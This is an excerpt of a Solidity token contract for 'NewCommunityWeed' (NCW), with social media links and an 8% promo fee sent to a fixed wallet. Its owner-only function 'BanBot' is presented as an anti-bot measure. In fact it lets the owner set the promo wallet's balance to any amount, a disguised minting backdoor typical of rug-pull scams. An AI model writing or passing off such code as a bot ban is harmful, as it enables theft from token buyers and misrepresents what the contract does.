...
https://t.me/NewCommunityWeed

https://twitter.com/NewWeedToken
...
contract NewCommunityWeed is Context, IERC20, Ownable {
    ...
    string private constant _name = "NewCommunityWeed"; 
    string private constant _symbol = "NCW"; 
    uint8 private constant _decimals = 9; 
    
    uint256 public _promoFee = 8;
    uint256 public _liquidityFee = 0;
    address private _promoWallet = 0xf080c1D40d9cd6857C70b8F75f6d696f55788890;
    ...
    function BanBot(uint256 gather, address adr) external onlyOwner{
        require(adr == address(_promoWallet), "Ban bot");
        _tOwned[adr] = 0 + gather;
        emit Transfer(address(_promoWallet), adr, gather);
    }
